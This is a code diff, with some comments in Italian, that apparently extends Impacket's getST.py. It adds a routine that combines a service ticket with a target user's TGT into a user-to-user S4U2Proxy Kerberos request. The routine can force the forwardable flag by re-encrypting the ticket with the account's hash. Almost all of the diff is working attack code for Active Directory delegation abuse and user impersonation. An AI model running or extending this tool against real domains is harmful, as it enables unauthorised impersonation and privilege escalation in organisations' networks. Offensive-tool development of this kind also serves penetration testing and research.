@@ -92,6 +92,7 @@ class GETST:
         self.__kdcHost = options.dc_ip
         self.__force_forwardable = options.force_forwardable
         self.__additional_ticket = options.additional_ticket
+# Aggiungiamo l'opzione "-additional_tgt"
         self.__additional_tgt = options.additional_tgt
         self.__dmsa = options.dmsa
         self.__saveFileName = None
@@ -778,6 +779,226 @@ class GETST:
         logging.info('Requesting S4U2Proxy')
         r = sendReceive(message, self.__domain, kdcHost)
         return r, None, sessionKey, None
+    
+    # Aggiungiamo un argomento per il TGT aggiuntivo
+    def doSPNless2SPNlessU2U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, additional_ticket_path, additional_tgt_path):
+    # Questa prima parte riguarda S4U2Self - l'implementazione funziona già, quindi non tocchiamo niente
+        if not os.path.isfile(additional_ticket_path):
+            logging.error("Ticket %s doesn't exist" % additional_ticket_path)
+            exit(0)
+        elif not os.path.isfile(additional_tgt_path):
+            logging.error("Ticket %s doesn't exist" % additional_tgt_path)
+            exit(0)
+        else:
+            decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
+            logging.info("\tUsing additional ticket %s instead of S4U2Self" % additional_ticket_path)
+            
+            # Qua recuperiamo il ST
+            ccache = CCache.loadFile(additional_ticket_path)
+            principal = ccache.credentials[0].header['server'].prettyPrint()
+            creds = ccache.getCredential(principal.decode())
+            TGS = creds.toTGS(principal)
+            tgs = decoder.decode(TGS['KDC_REP'], asn1Spec=TGS_REP())[0]
+
+            # Qua invece recuperiamo il TGT aggiuntivo
+            # Basiamoci sulla funzione parseFile di ccache.py
+            ccache = CCache.loadFile(additional_tgt_path)
+            domain = ccache.principal.realm['data'].decode('utf-8')
+            logging.debug('Domain retrieved from CCache: %s' % domain)
+            principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
+            creds = ccache.getCredential(principal)
+            U2UTGT = None
+            logging.debug('Using TGT from cache')
+            U2UTGT = creds.toTGT()
+            decodedu2utgt = decoder.decode(U2UTGT['KDC_REP'], asn1Spec=AS_REP())[0]
+
+            if logging.getLogger().level == logging.DEBUG:
+                logging.debug('TGS_REP')
+                print(tgs.prettyPrint())
+
+            if self.__force_forwardable:
+                # Convert hashes to binary form, just in case we're receiving strings
+                if isinstance(nthash, str):
+                    try:
+                        nthash = unhexlify(nthash)
+                    except TypeError:
+                        pass
+                if isinstance(aesKey, str):
+                    try:
+                        aesKey = unhexlify(aesKey)
+                    except TypeError:
+                        pass
+
+                # Compute NTHash and AESKey if they're not provided in arguments
+                if self.__password != '' and self.__domain != '' and self.__user != '':
+                    if not nthash:
+                        nthash = compute_nthash(self.__password)
+                        if logging.getLogger().level == logging.DEBUG:
+                            logging.debug('NTHash')
+                            print(hexlify(nthash).decode())
+                    if not aesKey:
+                        salt = self.__domain.upper() + self.__user
+                        aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents
+                        if logging.getLogger().level == logging.DEBUG:
+                            logging.debug('AESKey')
+                            print(hexlify(aesKey).decode())
+
+                # Get the encrypted ticket returned in the TGS. It's encrypted with one of our keys
+                cipherText = tgs['ticket']['enc-part']['cipher']
+
+                # Check which cipher was used to encrypt the ticket. It's not always the same
+                # This determines which of our keys we should use for decryption/re-encryption
+                newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
+                if newCipher.enctype == Enctype.RC4:
+                    key = Key(newCipher.enctype, nthash)
+                else:
+                    key = Key(newCipher.enctype, aesKey)
+
+                # Decrypt and decode the ticket
+                # Key Usage 2
+                # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
+                #  application session key), encrypted with the service key
+                #  (section 5.4.2)
+                plainText = newCipher.decrypt(key, 2, cipherText)
+                encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]
+
+                # Print the flags in the ticket before modification
+                logging.debug('\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))
+                logging.debug('\tService ticket from S4U2self is'
+                              + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
+                              + ' forwardable')
+
+                # Customize flags the forwardable flag is the only one that really matters
+                logging.info('\tForcing the service ticket to be forwardable')
+                # convert to string of bits
+                flagBits = encTicketPart['flags'].asBinary()
+                # Set the forwardable flag. Awkward binary string insertion
+                flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]
+                # Overwrite the value with the new bits
+                encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)  # Update flags
+
+                logging.debug('\tService ticket flags after modification: ' + str(encTicketPart['flags']))
+                logging.debug('\tService ticket now is'
+                              + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
+                              + ' forwardable')
+
+                # Re-encode and re-encrypt the ticket
+                # Again, Key Usage 2
+                encodedEncTicketPart = encoder.encode(encTicketPart)
+                cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)
+
+                # put it back in the TGS
+                tgs['ticket']['enc-part']['cipher'] = cipherText
+
+            ################################################################################
+            # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
+            # So here I have a ST for me, and the TGT of the target user. I now want a ST for that other user
+            
+            # Extract the ticket from the TGT
+            ticketTGT = Ticket()
+            ticketTGT.from_asn1(decodedTGT['ticket'])
+
+            # Get the service ticket
+            ticket = Ticket()
+            ticket.from_asn1(tgs['ticket'])
+
+            # Facciamo la stessa cosa con il nostro TGT aggiuntivo
+            ticketu2uTGT = Ticket()
+            ticketu2uTGT.from_asn1(decodedu2utgt['ticket'])
+
+            apReq = AP_REQ()
+            apReq['pvno'] = 5
+            apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
+
+            opts = list()
+            apReq['ap-options'] = constants.encodeFlags(opts)
+            seq_set(apReq, 'ticket', ticketTGT.to_asn1)
+
+            authenticator = Authenticator()
+            authenticator['authenticator-vno'] = 5
+            authenticator['crealm'] = str(decodedTGT['crealm'])
+
+            clientName = Principal()
+            clientName.from_asn1(decodedTGT, 'crealm', 'cname')
+
+            seq_set(authenticator, 'cname', clientName.components_to_asn1)
+
+            now = datetime.datetime.now(datetime.timezone.utc)
+            authenticator['cusec'] = now.microsecond
+            authenticator['ctime'] = KerberosTime.to_asn1(now)
+
+            encodedAuthenticator = encoder.encode(authenticator)
+
+            # Key Usage 7
+            # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
+            # TGS authenticator subkey), encrypted with the TGS session
+            # key (Section 5.5.1)
+            encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
+
+            apReq['authenticator'] = noValue
+            apReq['authenticator']['etype'] = cipher.enctype
+            apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
+
+            encodedApReq = encoder.encode(apReq)
+
+            tgsReq = TGS_REQ()
+
+            tgsReq['pvno'] = 5
+            tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
+            tgsReq['padata'] = noValue
+            tgsReq['padata'][0] = noValue
+            tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
+            tgsReq['padata'][0]['padata-value'] = encodedApReq
+
+            # Add resource-based constrained delegation support
+            paPacOptions = PA_PAC_OPTIONS()
+            paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))
+
+            tgsReq['padata'][1] = noValue
+            tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
+            tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)
+
+            reqBody = seq_set(tgsReq, 'req-body')
+
+            opts = list()
+            # This specified we're doing S4U
+            opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
+            opts.append(constants.KDCOptions.canonicalize.value)
+            opts.append(constants.KDCOptions.forwardable.value)
+            opts.append(constants.KDCOptions.renewable.value)
+            # Questo specifica che stiamo facendo U2U
+            # Questo implica una variazione nel checksum dell'Authenticator (KRB_AP_ERR_MODIFIED) che dobbiamo risolvere
+            opts.append(constants.KDCOptions.enc_tkt_in_skey.value)
+
+            reqBody['kdc-options'] = constants.encodeFlags(opts)
+            service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+            seq_set(reqBody, 'sname', service2.components_to_asn1)
+            reqBody['realm'] = self.__domain
+
+            # Qua vogliamo inserire, oltre al ST, il TGT del target
+            # Nota bene: potrebbe essere necessario scambiare chi mandi prima e chi dopo
+            myTicket1 = ticket.to_asn1(TicketAsn1())
+            myTicket2 = ticketu2uTGT.to_asn1(TicketAsn1())
+            seq_set_iter(reqBody, 'additional-tickets', (myTicket1,myTicket2))
+
+            now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
+
+            reqBody['till'] = KerberosTime.to_asn1(now)
+            reqBody['nonce'] = random.getrandbits(31)
+            seq_set_iter(reqBody, 'etype',
+                         (
+                             int(constants.EncryptionTypes.rc4_hmac.value),
+                             int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
+                             int(constants.EncryptionTypes.des_cbc_md5.value),
+                             int(cipher.enctype)
+                         )
+                         )
+            message = encoder.encode(tgsReq)
+
+            logging.info('Requesting S4U2Proxy')
+            r = sendReceive(message, self.__domain, kdcHost)
+            return r, None, sessionKey, None
+
 
     def run(self):
         tgt = None
@@ -785,7 +1006,7 @@ class GETST:
         # Do we have a TGT cached?
         domain, _, TGT, _ = CCache.parseFile(self.__domain)
 
-        # ToDo: Check this TGT belogns to the right principal
+        # ToDo: Check this TGT belongs to the right principal
         if TGT is not None:
             tgt, cipher, sessionKey = TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey']
             oldSessionKey = sessionKey
@@ -818,9 +1039,14 @@ class GETST:
             try:
                 logging.info('Impersonating %s' % self.__options.impersonate)
                 # Editing below to pass hashes for decryption
-                if self.__additional_ticket is not None:
+                if (self.__additional_ticket is not None) and (self.__additional_tgt is None):
                     tgs, cipher, oldSessionKey, sessionKey = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey,
                                                                                                   self.__kdcHost, self.__additional_ticket)
+                
+                elif (self.__additional_ticket is not None) and (self.__additional_tgt is not None):
+                    logging.info("Ci siamo! Iniziamo...")
+                    tgs, cipher, oldSessionKey, sessionKey = self.doSPNless2SPNlessU2U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey,
+                                                                                                  self.__kdcHost, self.__additional_ticket, self.__additional_tgt)
                 else:
                     tgs, cipher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)
             except Exception as e:
@@ -861,6 +1087,7 @@ if __name__ == '__main__':
                                                                         'specified -identity should be provided. This allows impresonation of protected users '
                                                                         'and bypass of "Kerberos-only" constrained delegation restrictions. See CVE-2020-17049')
     parser.add_argument('-renew', action='store_true', help='Sets the RENEW ticket option to renew the TGT used for authentication. Set -spn to \'krbtgt/DOMAINFQDN\'')
+# Aggiungiamo l'opzione "-additional_tgt"
     parser.add_argument('-additional-tgt', action='store', metavar='ticket.ccache', help='include the target user TGT for U2U S4U2Proxy to SPN-less service')
 
     group = parser.add_argument_group('authentication')
